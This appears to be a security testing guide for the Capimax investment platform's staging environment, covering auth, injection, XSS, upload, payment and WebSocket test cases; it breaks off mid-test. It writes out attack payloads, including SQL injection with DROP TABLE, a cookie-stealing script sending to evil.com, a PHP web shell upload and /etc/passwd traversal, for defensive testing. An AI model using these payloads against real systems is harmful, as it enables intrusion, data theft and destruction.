# Security Testing Guide - Capimax Platform

**Version:** 1.0
**Last Updated:** January 2025
**Test Environment:** UAT/Staging before Production

---

## Table of Contents

1. [Pre-Test Preparation](#pre-test-preparation)
2. [Authentication & Authorization Testing](#authentication--authorization-testing)
3. [SQL Injection Testing](#sql-injection-testing)
4. [Cross-Site Scripting (XSS) Testing](#cross-site-scripting-xss-testing)
5. [CSRF Protection Testing](#csrf-protection-testing)
6. [API Security Testing](#api-security-testing)
7. [Rate Limiting & DDoS Protection](#rate-limiting--ddos-protection)
8. [Session Management Testing](#session-management-testing)
9. [File Upload Security](#file-upload-security)
10. [Security Headers Testing](#security-headers-testing)
11. [SSL/TLS Configuration Testing](#ssltls-configuration-testing)
12. [Payment Security Testing](#payment-security-testing)
13. [Blockchain Security Testing](#blockchain-security-testing)
14. [WebSocket Security Testing](#websocket-security-testing)
15. [Sensitive Data Exposure Testing](#sensitive-data-exposure-testing)
16. [Automated Security Scanning](#automated-security-scanning)

---

## Pre-Test Preparation

### Required Tools

```bash
# Install security testing tools
pip install safety bandit semgrep
npm install -g npm-audit snyk

# Install penetration testing tools
sudo apt install -y \
    nmap \
    sqlmap \
    nikto \
    owasp-zap \
    burpsuite \
    curl \
    jq

# Install SSL testing tools
sudo apt install -y testssl.sh
# or: brew install testssl
```

### Test Accounts Setup

Create test accounts for each role:
- **Investor:** investor_test@test.com
- **Property Owner:** owner_test@test.com
- **Broker:** broker_test@test.com
- **Admin:** admin_test@test.com

### Environment Variables

```bash
# Set test environment
export TEST_BASE_URL="https://uat.capimaxinvestment.com"
export TEST_API_URL="$TEST_BASE_URL/api/v1"
export TEST_WS_URL="wss://uat.capimaxinvestment.com/ws"
```

---

## Authentication & Authorization Testing

### Test Case AUTH-001: JWT Token Security

**Objective:** Verify JWT token implementation security

**Steps:**
1. Login and capture JWT access token
2. Decode token using jwt.io
3. Verify token contains minimal claims (no sensitive data)
4. Verify token expiration (should be 60 minutes)
5. Verify refresh token expiration (should be 7 days)

**Expected Results:**
- Token should NOT contain password, email password, or sensitive PII
- Token should expire after 60 minutes
- Refresh token should work only once

**Test Commands:**
```bash
# Login and get token
TOKEN=$(curl -X POST "$TEST_API_URL/auth/login/" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"TestPass123!"}' \
  | jq -r '.data.access')

# Decode token (manual check at jwt.io or use):
echo $TOKEN | cut -d'.' -f2 | base64 -d | jq

# Test expired token (wait 60 minutes)
sleep 3600
curl -X GET "$TEST_API_URL/properties/" \
  -H "Authorization: Bearer $TOKEN"
# Expected: 401 Unauthorized
```

**Pass Criteria:**
- ✅ Token contains only user_id, email, role, exp, iat
- ✅ Expired token returns 401
- ✅ Refresh token can be used only once

---

### Test Case AUTH-002: Brute Force Protection

**Objective:** Verify login attempt rate limiting

**Steps:**
1. Attempt login 10 times with wrong password
2. Verify account lockout or rate limiting
3. Wait 5 minutes and verify access restored

**Test Script:**
```bash
# Run multiple failed login attempts
for i in {1..10}; do
  echo "Attempt $i"
  curl -X POST "$TEST_API_URL/auth/login/" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"WrongPassword"}' \
    -w "\nHTTP Code: %{http_code}\n"
  sleep 1
done

# Attempt 6-10 should return 429 Too Many Requests
```

**Pass Criteria:**
- ✅ After 5 failed attempts, returns 429 or account locked
- ✅ Error message doesn't reveal if account exists
- ✅ Access restored after cooldown period

---

### Test Case AUTH-003: Authorization Bypass Testing

**Objective:** Verify role-based access control (RBAC)

**Test Matrix:**

| Endpoint | Investor | Owner | Broker | Admin | Expected |
|----------|----------|-------|--------|-------|----------|
| GET /properties/ | ✅ | ✅ | ✅ | ✅ | All allowed |
| POST /properties/ | ❌ | ✅ | ❌ | ✅ | Owner/Admin only |
| GET /dashboard/investor/ | ✅ | ❌ | ❌ | ✅ | Investor/Admin only |
| GET /dashboard/property-owner/ | ❌ | ✅ | ❌ | ✅ | Owner/Admin only |
| GET /admin/users/ | ❌ | ❌ | ❌ | ✅ | Admin only |
| POST /broker/applications/ | ❌ | ❌ | ✅ | ✅ | Broker/Admin only |

**Test Script:**
```bash
# Get investor token
INVESTOR_TOKEN=$(curl -X POST "$TEST_API_URL/auth/login/" \
  -H "Content-Type: application/json" \
  -d '{"email":"investor@test.com","password":"TestPass123!"}' \
  | jq -r '.data.access')

# Attempt to create property (should fail)
curl -X POST "$TEST_API_URL/properties/" \
  -H "Authorization: Bearer $INVESTOR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"Unauthorized Property"}' \
  -w "\nHTTP Code: %{http_code}\n"
# Expected: 403 Forbidden

# Attempt to access admin panel (should fail)
curl -X GET "$TEST_API_URL/admin/users/" \
  -H "Authorization: Bearer $INVESTOR_TOKEN" \
  -w "\nHTTP Code: %{http_code}\n"
# Expected: 403 Forbidden
```

**Pass Criteria:**
- ✅ All unauthorized access attempts return 403
- ✅ Error messages don't reveal system internals
- ✅ Logs capture unauthorized access attempts

---

### Test Case AUTH-004: Password Reset Security

**Objective:** Verify password reset flow security

**Steps:**
1. Request password reset for existing account
2. Request password reset for non-existent account
3. Verify response doesn't reveal account existence
4. Verify reset token expires after 1 hour
5. Verify reset token can be used only once
6. Verify old password doesn't work after reset

**Test Commands:**
```bash
# Request password reset
curl -X POST "$TEST_API_URL/auth/password/reset/" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com"}'

# Request for non-existent account
curl -X POST "$TEST_API_URL/auth/password/reset/" \
  -H "Content-Type: application/json" \
  -d '{"email":"nonexistent@test.com"}'

# Both should return same generic message:
# "If account exists, password reset email has been sent"
```

**Pass Criteria:**
- ✅ Generic response for both existing and non-existent accounts
- ✅ Reset token expires after 1 hour
- ✅ Reset token becomes invalid after use
- ✅ Old password fails after successful reset

---

## SQL Injection Testing

### Test Case SQL-001: Authentication Bypass

**Objective:** Test for SQL injection in login endpoint

**Test Payloads:**
```bash
# Test 1: Classic SQL injection
curl -X POST "$TEST_API_URL/auth/login/" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@test.com\" OR \"1\"=\"1","password":"anything"}'

# Test 2: Comment injection
curl -X POST "$TEST_API_URL/auth/login/" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@test.com\"--","password":"anything"}'

# Test 3: Union-based injection
curl -X POST "$TEST_API_URL/auth/login/" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@test.com\" UNION SELECT * FROM users--","password":"anything"}'
```

**Pass Criteria:**
- ✅ All attempts return 400/401 with validation error
- ✅ No database errors exposed
- ✅ No successful authentication
- ✅ Attack logged in security logs

---

### Test Case SQL-002: Search Field Injection

**Objective:** Test SQL injection in property search

**Test Payloads:**
```bash
# Test property search with SQL injection
curl -X GET "$TEST_API_URL/properties/?search=Villa' OR '1'='1" \
  -H "Authorization: Bearer $TOKEN"

curl -X GET "$TEST_API_URL/properties/?search=Beach'; DROP TABLE properties;--" \
  -H "Authorization: Bearer $TOKEN"

curl -X GET "$TEST_API_URL/properties/?location=Dubai' UNION SELECT password FROM users--" \
  -H "Authorization: Bearer $TOKEN"
```

**Pass Criteria:**
- ✅ Returns safe search results or validation error
- ✅ No database errors exposed
- ✅ Database tables remain intact
- ✅ Special characters properly escaped

---

### Test Case SQL-003: Automated SQLMap Testing

**Objective:** Run automated SQL injection scanner

**Test Commands:**
```bash
# Test login endpoint
sqlmap -u "$TEST_API_URL/auth/login/" \
  --data '{"email":"test@test.com","password":"test"}' \
  --method POST \
  --headers "Content-Type: application/json" \
  --batch \
  --level 5 \
  --risk 3

# Test property detail endpoint
sqlmap -u "$TEST_API_URL/properties/1/" \
  --cookie "Authorization: Bearer $TOKEN" \
  --batch \
  --level 5 \
  --risk 3

# Test search parameters
sqlmap -u "$TEST_API_URL/properties/?search=test" \
  --cookie "Authorization: Bearer $TOKEN" \
  --batch \
  --level 5 \
  --risk 3
```

**Pass Criteria:**
- ✅ SQLMap finds no injectable parameters
- ✅ All database queries use parameterized statements
- ✅ No database errors exposed in responses

---

## Cross-Site Scripting (XSS) Testing

### Test Case XSS-001: Reflected XSS

**Objective:** Test for reflected XSS in search and error messages

**Test Payloads:**
```bash
# Test 1: Basic script injection
curl -X GET "$TEST_API_URL/properties/?search=<script>alert('XSS')</script>" \
  -H "Authorization: Bearer $TOKEN"

# Test 2: Event handler injection
curl -X GET "$TEST_API_URL/properties/?search=<img src=x onerror=alert('XSS')>" \
  -H "Authorization: Bearer $TOKEN"

# Test 3: SVG injection
curl -X GET "$TEST_API_URL/properties/?search=<svg onload=alert('XSS')>" \
  -H "Authorization: Bearer $TOKEN"

# Test 4: JavaScript protocol
curl -X GET "$TEST_API_URL/properties/?search=javascript:alert('XSS')" \
  -H "Authorization: Bearer $TOKEN"
```

**Pass Criteria:**
- ✅ All special characters properly escaped in response
- ✅ Script tags rendered as text, not executed
- ✅ CSP headers prevent inline script execution
- ✅ No JavaScript code present in response body

---

### Test Case XSS-002: Stored XSS

**Objective:** Test for stored XSS in user-generated content

**Test Steps:**
```bash
# Test property description
curl -X POST "$TEST_API_URL/properties/" \
  -H "Authorization: Bearer $OWNER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Test Property",
    "description": "<script>alert(\"XSS\")</script>Nice property",
    "location": "Dubai<img src=x onerror=alert(1)>",
    "price": 1000000
  }'

# Retrieve and check if scripts are sanitized
curl -X GET "$TEST_API_URL/properties/1/" \
  -H "Authorization: Bearer $TOKEN"

# Test review submission
curl -X POST "$TEST_API_URL/properties/1/reviews/" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "rating": 5,
    "comment": "<script>document.location=\"http://evil.com?cookie=\"+document.cookie</script>"
  }'

# Test user profile
curl -X PATCH "$TEST_API_URL/accounts/profile/" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "full_name": "<svg onload=alert(1)>John Doe",
    "bio": "Investor <script>alert(\"XSS\")</script>"
  }'
```

**Pass Criteria:**
- ✅ All HTML/JavaScript properly escaped or sanitized
- ✅ Stored data doesn't execute when retrieved
- ✅ Frontend uses DOMPurify or equivalent for sanitization
- ✅ Backend validates and strips dangerous HTML

---

### Test Case XSS-003: DOM-Based XSS

**Objective:** Test frontend JavaScript for DOM XSS vulnerabilities

**Manual Testing Steps:**
1. Open browser developer console
2. Navigate to property search: `https://uat.capimaxinvestment.com/properties?search=<img src=x onerror=alert(1)>`
3. Check if URL parameter rendered unsafely
4. Test hash fragments: `https://uat.capimaxinvestment.com/properties#<script>alert(1)</script>`
5. Test with encoded payloads: `%3Cscript%3Ealert(1)%3C/script%3E`

**Code Review Checklist:**
- ✅ No use of `dangerouslySetInnerHTML` without sanitization
- ✅ No use of `eval()`, `innerHTML`, `document.write()`
- ✅ URL parameters sanitized before rendering
- ✅ User input properly escaped in React components

---

## CSRF Protection Testing

### Test Case CSRF-001: CSRF Token Validation

**Objective:** Verify CSRF protection for state-changing operations

**Test Steps:**
```bash
# Attempt POST without CSRF token (if cookie-based auth used)
curl -X POST "$TEST_API_URL/investments/" \
  -H "Content-Type: application/json" \
  -d '{"property_id": 1, "amount": 5000}'
# Expected: 403 Forbidden (CSRF token missing)

# Attempt with invalid CSRF token
curl -X POST "$TEST_API_URL/investments/" \
  -H "Content-Type: application/json" \
  -H "X-CSRFToken: invalid_token_12345" \
  -d '{"property_id": 1, "amount": 5000}'
# Expected: 403 Forbidden (CSRF token invalid)
```

**Pass Criteria:**
- ✅ All state-changing endpoints (POST, PUT, PATCH, DELETE) require CSRF token
- ✅ GET requests don't require CSRF token
- ✅ Invalid/missing CSRF token returns 403
- ✅ CSRF tokens are unique per session

---

### Test Case CSRF-002: Cross-Origin Request Testing

**Objective:** Verify CORS configuration prevents unauthorized origins

**Test HTML (host on external domain):**
```html
<!DOCTYPE html>
<html>
<body>
<script>
// Attempt cross-origin request
fetch('https://uat.capimaxinvestment.com/api/v1/investments/', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer [STOLEN_TOKEN]'
  },
  body: JSON.stringify({
    property_id: 1,
    amount: 10000
  })
})
.then(r => console.log('Success:', r))
.catch(e => console.log('Blocked:', e));
</script>
</body>
</html>
```

**Pass Criteria:**
- ✅ Requests from unauthorized origins are blocked
- ✅ CORS headers only allow whitelisted domains
- ✅ Preflight OPTIONS requests properly handled
- ✅ Credentials not sent to unauthorized origins

---

## API Security Testing

### Test Case API-001: Insecure Direct Object Reference (IDOR)

**Objective:** Test for unauthorized access to other users' resources

**Test Scenarios:**
```bash
# Login as investor_test@test.com (user_id: 1)
INVESTOR_TOKEN=$(curl -X POST "$TEST_API_URL/auth/login/" \
  -H "Content-Type: application/json" \
  -d '{"email":"investor_test@test.com","password":"TestPass123!"}' \
  | jq -r '.data.access')

# Attempt to access another user's profile (user_id: 2)
curl -X GET "$TEST_API_URL/accounts/profile/2/" \
  -H "Authorization: Bearer $INVESTOR_TOKEN"
# Expected: 403 Forbidden

# Attempt to access another user's investments
curl -X GET "$TEST_API_URL/investments/?user_id=2" \
  -H "Authorization: Bearer $INVESTOR_TOKEN"
# Expected: 403 or only own investments returned

# Attempt to modify another user's investment
curl -X PATCH "$TEST_API_URL/investments/5/" \
  -H "Authorization: Bearer $INVESTOR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "cancelled"}'
# Expected: 403 or 404 if investment belongs to another user

# Attempt to access another user's KYC documents
curl -X GET "$TEST_API_URL/kyc/documents/2/" \
  -H "Authorization: Bearer $INVESTOR_TOKEN"
# Expected: 403 Forbidden
```

**Pass Criteria:**
- ✅ Users can only access their own resources
- ✅ ID enumeration doesn't expose other users' data
- ✅ 403/404 returned for unauthorized access attempts
- ✅ Error messages don't reveal resource existence

---

### Test Case API-002: Mass Assignment Vulnerability

**Objective:** Test for unauthorized field modification

**Test Steps:**
```bash
# Attempt to set privileged fields during registration
curl -X POST "$TEST_API_URL/auth/register/" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "hacker@test.com",
    "password": "TestPass123!",
    "full_name": "Hacker",
    "is_staff": true,
    "is_superuser": true,
    "is_verified": true,
    "role": "admin"
  }'

# Attempt to modify privileged fields in profile update
curl -X PATCH "$TEST_API_URL/accounts/profile/" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "full_name": "Updated Name",
    "is_staff": true,
    "is_superuser": true,
    "role": "admin"
  }'
```

**Pass Criteria:**
- ✅ Privileged fields (is_staff, is_superuser, role) ignored or rejected
- ✅ Only whitelisted fields can be modified
- ✅ Serializer uses explicit field lists, not `fields = '__all__'`
- ✅ Validation errors for unauthorized field attempts

---

### Test Case API-003: Excessive Data Exposure

**Objective:** Verify API responses don't leak sensitive data

**Test Steps:**
```bash
# Check user list endpoint
curl -X GET "$TEST_API_URL/accounts/users/" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | jq

# Verify response doesn't contain:
# - password hashes
# - email passwords
# - API keys
# - private keys
# - full credit card numbers
# - SSN or sensitive KYC data
```

**Pass Criteria:**
- ✅ Password fields never returned in responses
- ✅ Sensitive PII properly masked (e.g., `****1234` for cards)
- ✅ Email addresses not exposed to unauthorized users
- ✅ Internal IDs (like wallet private keys) never exposed

---

## Rate Limiting & DDoS Protection

### Test Case RATE-001: API Rate Limiting

**Objective:** Verify rate limits properly enforced

**Test Script:**
```bash
# Test general API rate limit (10 requests/second)
echo "Testing API rate limit..."
for i in {1..20}; do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X GET "$TEST_API_URL/properties/" \
    -H "Authorization: Bearer $TOKEN")
  echo "Request $i: $RESPONSE"
  if [ "$RESPONSE" == "429" ]; then
    echo "Rate limit triggered at request $i"
    break
  fi
done

# Test authentication rate limit (5 requests/minute)
echo "Testing auth rate limit..."
for i in {1..10}; do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "$TEST_API_URL/auth/login/" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong"}')
  echo "Login attempt $i: $RESPONSE"
  sleep 1
done

# Test payment rate limit (3 requests/minute)
echo "Testing payment rate limit..."
for i in {1..5}; do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "$TEST_API_URL/payments/create-intent/" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"amount": 100, "currency": "USD"}')
  echo "Payment request $i: $RESPONSE"
  sleep 15
done
```

**Pass Criteria:**
- ✅ API requests limited to 10/second (burst 20 allowed)
- ✅ Auth requests limited to 5/minute
- ✅ Payment requests limited to 3/minute
- ✅ 429 status code with Retry-After header returned
- ✅ Rate limits reset after specified window

---

### Test Case RATE-002: DDoS Stress Testing

**Objective:** Test system resilience under high load

**Test Script:**
```bash
# Use Apache Bench for stress testing
ab -n 10000 -c 100 -t 30 "$TEST_API_URL/properties/"

# Use wrk for sustained load
wrk -t12 -c400 -d30s "$TEST_API_URL/properties/"

# Monitor:
# - Response times remain acceptable
# - Error rate stays low
# - Server doesn't crash
# - Rate limiting engages appropriately
```

**Pass Criteria:**
- ✅ System remains responsive under load
- ✅ No 500 errors or crashes
- ✅ Rate limiting protects backend
- ✅ Nginx connection limits enforced
- ✅ Response times degrade gracefully

---

## Session Management Testing

### Test Case SESS-001: Session Fixation

**Objective:** Verify new session created after login

**Test Steps:**
1. Get initial session ID
2. Login with valid credentials
3. Verify session ID changed after login
4. Verify old session ID no longer valid

**Pass Criteria:**
- ✅ Session ID regenerated after successful login
- ✅ Session ID regenerated after privilege escalation
- ✅ Old session IDs invalidated

---

### Test Case SESS-002: Session Timeout

**Objective:** Verify inactive sessions expire

**Test Steps:**
```bash
# Login and get token
TOKEN=$(curl -X POST "$TEST_API_URL/auth/login/" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"TestPass123!"}' \
  | jq -r '.data.access')

# Wait 60 minutes (access token expiry)
sleep 3600

# Attempt API call
curl -X GET "$TEST_API_URL/properties/" \
  -H "Authorization: Bearer $TOKEN"
# Expected: 401 Unauthorized

# Test refresh token expiry (7 days)
# Would need to wait 7 days or manipulate system time
```

**Pass Criteria:**
- ✅ Access tokens expire after 60 minutes
- ✅ Refresh tokens expire after 7 days
- ✅ Expired tokens return 401
- ✅ No automatic session extension beyond limits

---

### Test Case SESS-003: Concurrent Session Handling

**Objective:** Verify multiple login handling

**Test Steps:**
1. Login from Device A (browser 1)
2. Login from Device B (browser 2) with same account
3. Verify both sessions initially valid
4. Logout from Device A
5. Verify Device B session still valid (or invalidated based on policy)

**Pass Criteria:**
- ✅ System handles concurrent sessions appropriately
- ✅ Logout from one device doesn't affect others (JWT stateless)
- ✅ Refresh token rotation prevents token reuse
- ✅ User can view active sessions (if implemented)

---

## File Upload Security

### Test Case FILE-001: Malicious File Upload

**Objective:** Test file upload validation for KYC documents

**Test Payloads:**
```bash
# Test 1: Executable file with image extension
curl -X POST "$TEST_API_URL/kyc/documents/" \
  -H "Authorization: Bearer $TOKEN" \
  -F "document_type=passport" \
  -F "file=@malicious.exe.jpg"

# Test 2: PHP shell disguised as image
echo "<?php system(\$_GET['cmd']); ?>" > shell.php.jpg
curl -X POST "$TEST_API_URL/kyc/documents/" \
  -H "Authorization: Bearer $TOKEN" \
  -F "document_type=passport" \
  -F "file=@shell.php.jpg"

# Test 3: Oversized file (test file size limits)
dd if=/dev/zero of=large_file.jpg bs=1M count=20  # 20MB file
curl -X POST "$TEST_API_URL/kyc/documents/" \
  -H "Authorization: Bearer $TOKEN" \
  -F "document_type=passport" \
  -F "file=@large_file.jpg"

# Test 4: Invalid file type
curl -X POST "$TEST_API_URL/kyc/documents/" \
  -H "Authorization: Bearer $TOKEN" \
  -F "document_type=passport" \
  -F "file=@document.exe"
```

**Pass Criteria:**
- ✅ Only allowed file types accepted (PDF, JPG, PNG)
- ✅ File size limits enforced (e.g., max 10MB)
- ✅ File content validated (magic number check, not just extension)
- ✅ Uploaded files stored outside webroot
- ✅ Uploaded files served with correct content-type
- ✅ Executable permissions not set on uploaded files

---

### Test Case FILE-002: Path Traversal in File Access

**Objective:** Test for directory traversal vulnerabilities

**Test Steps:**
```bash
# Attempt to access files using path traversal
curl -X GET "$TEST_API_URL/kyc/documents/../../../etc/passwd" \
  -H "Authorization: Bearer $TOKEN"

curl -X GET "$TEST_API_URL/kyc/documents/..%2F..%2F..%2Fetc%2Fpasswd" \
  -H "Authorization: Bearer $TOKEN"

# Test encoded variations
curl -X GET "$TEST_API_URL/kyc/documents/%2e%2e%2f%2e%2e%2fetc/passwd" \
  -H "Authorization: Bearer $TOKEN"
```

**Pass Criteria:**
- ✅ Path traversal attempts blocked
- ✅ Files accessed only from designated upload directory
- ✅ User can only access their own uploaded files
- ✅ 403/404 returned for unauthorized access

---

## Security Headers Testing

### Test Case HEAD-001: HTTP Security Headers

**Objective:** Verify all security headers present

**Test Command:**
```bash
# Check security headers
curl -I https://uat.capimaxinvestment.com | grep -E "Strict-Transport-Security|Content-Security-Policy|X-Frame-Options|X-Content-Type-Options|Referrer-Policy|Permissions-Policy"
```

**Expected Headers:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://js.stripe.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://api.stripe.com wss://uat.capimaxinvestment.com;
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

**Pass Criteria:**
- ✅ All security headers present
- ✅ HSTS enabled with appropriate max-age
- ✅ CSP prevents inline scripts (except whitelisted)
- ✅ X-Frame-Options prevents clickjacking
- ✅ X-Content-Type-Options prevents MIME sniffing

---

### Test Case HEAD-002: Sensitive Information in Headers

**Objective:** Verify no sensitive info leaked in headers

**Test Command:**
```bash
# Check response headers
curl -I "$TEST_API_URL/properties/" \
  -H "Authorization: Bearer $TOKEN"
```

**Pass Criteria:**
- ✅ No `Server` header revealing server version
- ✅ No `X-Powered-By` header
- ✅ No internal IP addresses exposed
- ✅ No stack traces in headers
- ✅ No database info in headers

---

## SSL/TLS Configuration Testing

### Test Case TLS-001: SSL Labs Test

**Objective:** Achieve A+ rating on SSL Labs

**Steps:**
1. Go to https://www.ssllabs.com/ssltest/
2. Enter: `uat.capimaxinvestment.com`
3. Wait for scan completion

**Pass Criteria:**
- ✅ Overall rating: A or A+
- ✅ Certificate: Valid and trusted
- ✅ Protocol Support: TLS 1.2 and 1.3 only
- ✅ Key Exchange: Strong (2048-bit or higher)
- ✅ Cipher Strength: Strong ciphers only
- ✅ No support for SSLv2, SSLv3, TLS 1.0, TLS 1.1
- ✅ Perfect Forward Secrecy (PFS) supported
- ✅ HSTS enabled

---

### Test Case TLS-002: Certificate Validation

**Objective:** Verify SSL certificate configuration

**Test Commands:**
```bash
# Check certificate expiry
echo | openssl s_client -connect uat.capimaxinvestment.com:443 2>/dev/null | openssl x509 -noout -dates

# Check certificate chain
echo | openssl s_client -connect uat.capimaxinvestment.com:443 -showcerts

# Test SSL/TLS protocols
testssl.sh --protocols uat.capimaxinvestment.com

# Test cipher suites
testssl.sh --ciphers uat.capimaxinvestment.com
```

**Pass Criteria:**
- ✅ Certificate valid and not expired
- ✅ Certificate matches domain name
- ✅ Certificate chain complete and trusted
- ✅ Only TLS 1.2 and 1.3 enabled
- ✅ Weak ciphers disabled
- ✅ Certificate will be valid for next 30+ days

---

## Payment Security Testing

### Test Case PAY-001: Payment Amount Manipulation

**Objective:** Verify payment amounts cannot be manipulated

**Test Steps:**
```bash
# Create payment intent with $100
INTENT=$(curl -X POST "$TEST_API_URL/payments/stripe/create-intent/" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount": 100, "property_id": 1}' \
  | jq -r '.data.client_secret')

# Attempt to modify amount on frontend before confirmation
# (Manual test: modify JavaScript to send different amount)

# Attempt to manipulate server-side validation
curl -X POST "$TEST_API_URL/payments/stripe/confirm/" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "payment_intent_id": "'$INTENT'",
    "property_id": 1,
    "amount": 10
  }'
# Expected: Validation error or amount mismatch
```

**Pass Criteria:**
- ✅ Payment amount verified server-side
- ✅ Amount cannot be modified after intent creation
- ✅ Mismatch between intent and confirmation rejected
- ✅ All amounts logged for audit trail

---

### Test Case PAY-002: Payment Replay Attack

**Objective:** Prevent payment transaction replay

**Test Steps:**
```bash
# Complete a successful payment
PAYMENT_ID="pi_1234567890"

# Attempt to replay the same payment confirmation
curl -X POST "$TEST_API_URL/payments/stripe/confirm/" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "payment_intent_id": "'$PAYMENT_ID'",
    "property_id": 1
  }'
# Expected: Error - payment already processed
```

**Pass Criteria:**
- ✅ Payment IDs tracked and verified as unique
- ✅ Duplicate payment attempts rejected
- ✅ Idempotency keys used for payment operations
- ✅ Payment status verified with provider before processing

---

### Test Case PAY-003: Webhook Signature Verification

**Objective:** Verify webhook signatures validated

**Test Steps:**
```bash
# Send webhook without signature
curl -X POST "$TEST_API_URL/payments/stripe/webhook/" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "payment_intent.succeeded",
    "data": {
      "object": {
        "id": "pi_fake",
        "amount": 1000000
      }
    }
  }'
# Expected: 400 Bad Request (signature missing/invalid)

# Send webhook with invalid signature
curl -X POST "$TEST_API_URL/payments/stripe/webhook/" \
  -H "Content-Type: application/json" \
  -H "Stripe-Signature: t=1234,v1=fake_signature" \
  -d '{
    "type": "payment_intent.succeeded",
    "data": {
      "object": {
        "id": "pi_fake",
        "amount": 1000000
      }
    }
  }'
# Expected: 400 Bad Request (signature invalid)
```

**Pass Criteria:**
- ✅ All webhook requests require valid signature
- ✅ Invalid signatures rejected with 400
- ✅ Webhook secret properly configured
- ✅ Replay attacks prevented (timestamp validation)

---

## Blockchain Security Testing

### Test Case BLOCK-001: Private Key Security

**Objective:** Verify private keys never exposed

**Test Steps:**
```bash
# Check API responses for private key leakage
curl -X GET "$TEST_API_URL/blockchain/wallets/" \
  -H "Authorization: Bearer $TOKEN" | grep -i "private"

# Check logs for private key exposure
sudo grep -r "private.*key" /var/log/capimax/ | grep -v "REDACTED"

# Check environment file security
ls -la /path/to/.env
# Expected: 600 (owner read/write only)
```

**Pass Criteria:**
- ✅ Private keys never in API responses
- ✅ Private keys never in logs (always redacted)
- ✅ Environment files have restrictive permissions (600)
- ✅ Private keys encrypted at rest
- ✅ Private keys never committed to git

---

### Test Case BLOCK-002: Smart Contract Interaction Security

**Objective:** Verify secure smart contract interactions

**Test Steps:**
```bash
# Test token transfer authorization
curl -X POST "$TEST_API_URL/blockchain/transfer/" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "from": "0xAnotherUsersAddress",
    "to": "0xMyAddress",
    "amount": 1000
  }'
# Expected: 403 Forbidden (cannot transfer from others' addresses)

# Test contract function access control
# Verify only authorized users can call privileged functions
```

**Pass Criteria:**
- ✅ User can only control their own wallet
- ✅ Contract interactions properly authorized
- ✅ Gas fees calculated and disclosed before execution
- ✅ Transaction confirmation required before execution
- ✅ Failed transactions properly handled

---

## WebSocket Security Testing

### Test Case WS-001: WebSocket Authentication

**Objective:** Verify WebSocket connections require authentication

**Test Script:**
```python
import asyncio
import websockets
import json

async def test_ws_auth():
    # Test 1: Connection without token
    try:
        async with websockets.connect('wss://uat.capimaxinvestment.com/ws/notifications/1/') as ws:
            print("FAIL: Connected without authentication")
    except Exception as e:
        print(f"PASS: Connection rejected without auth: {e}")

    # Test 2: Connection with invalid token
    try:
        async with websockets.connect(
            'wss://uat.capimaxinvestment.com/ws/notifications/1/',
            extra_headers={'Authorization': 'Bearer invalid_token'}
        ) as ws:
            print("FAIL: Connected with invalid token")
    except Exception as e:
        print(f"PASS: Invalid token rejected: {e}")

    # Test 3: Connection with valid token
    token = "YOUR_VALID_TOKEN"
    try:
        async with websockets.connect(
            'wss://uat.capimaxinvestment.com/ws/notifications/1/',
            extra_headers={'Authorization': f'Bearer {token}'}
        ) as ws:
            print("PASS: Connected with valid token")

            # Test 4: Attempt to subscribe to another user's channel
            await ws.send(json.dumps({
                'action': 'subscribe',
                'user_id': 2  # Different user
            }))
            response = await ws.recv()
            print(f"Response: {response}")
            # Expected: Permission denied

    except Exception as e:
        print(f"Connection error: {e}")

asyncio.run(test_ws_auth())
```

**Pass Criteria:**
- ✅ WebSocket connections require valid JWT token
- ✅ Expired tokens rejected
- ✅ Users can only subscribe to their own channels
- ✅ Unauthorized subscription attempts rejected

---

### Test Case WS-002: WebSocket Message Injection

**Objective:** Verify WebSocket messages properly validated

**Test Steps:**
```python
# Test malicious message injection
await ws.send(json.dumps({
    'action': 'broadcast',
    'message': '<script>alert("XSS")</script>',
    'user_id': 1
}))

# Test message flooding (rate limiting)
for i in range(100):
    await ws.send(json.dumps({'action': 'ping'}))
    # Expected: Connection throttled or closed after limit
```

**Pass Criteria:**
- ✅ WebSocket messages validated and sanitized
- ✅ Rate limiting prevents message flooding
- ✅ XSS payloads properly escaped
- ✅ Authorization checked for each message action

---

## Sensitive Data Exposure Testing

### Test Case DATA-001: Error Message Information Disclosure

**Objective:** Verify error messages don't leak system info

**Test Steps:**
```bash
# Test database errors
curl -X GET "$TEST_API_URL/properties/invalid" \
  -H "Authorization: Bearer $TOKEN"

# Test server errors
curl -X POST "$TEST_API_URL/investments/" \
